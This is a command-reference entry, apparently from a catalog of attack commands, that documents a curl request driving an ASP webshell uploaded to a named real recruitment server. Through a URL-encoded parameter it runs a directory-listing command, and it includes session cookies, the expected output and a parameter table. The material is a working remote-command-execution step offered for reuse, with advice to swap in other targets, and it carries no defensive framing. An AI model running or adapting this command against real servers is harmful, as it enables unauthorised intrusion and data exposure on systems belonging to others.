---
id: cmd-003
data: >-
  curl -i -s -k -X GET -H 'Host: ecjobs.starbucks.com.cn' -H 'User-Agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101
  Firefox/63.0' -H 'Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H
  'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
  -H 'Accept-Encoding: gzip, deflate' -H 'Connection: close' -H 'Cookie:
  _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo;
  ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF;
  ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H 'Upgrade-Insecure-Requests:
  1' -b '_ga=GA1.3.779308870.1546486037;
  ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo;
  ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF;
  ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF'
  'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\TrustHX\\STBKSERM101\\www_app%20%2fd%2fs%2fb'
tags:
  - rce
  - webshell
type: command
output: >-
  HTTP/1.1 200 OK ... <html><body><h1>POC by hackerone_john stone</h1><textarea
  ...> [directory listing] </textarea></body></html>
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:22.924Z'
verified: false
validated: true
submitted: true
---
# curl-webshell-dir

## Command

```bash
curl -i -s -k -X GET -H 'Host: ecjobs.starbucks.com.cn' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: close' -H 'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H 'Upgrade-Insecure-Requests: 1' -b '_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' 'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\TrustHX\\STBKSERM101\\www_app%20%2fd%2fs%2fb'
```

## Description

Sends a GET request to the ASP webshell with URL-encoded dir command to retrieve directory listing, maintaining session via cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -i | Include HTTP headers | Yes |
| -s | Silent mode | Yes |
| -k | Insecure SSL | Yes |
| -X GET | GET method | Yes |
| -H | Custom headers (Host, UA, etc.) | Yes |
| -b | Cookie string | Yes |
| URL | Webshell endpoint with encoded getsc | Yes |

## Examples

### Basic Usage

The full command above.

### Advanced Usage

Replace GUID and path for different targets.

## Expected Output

HTTP response with embedded directory listing in textarea.

## Related

- [[commands/curl-webshell-type]]
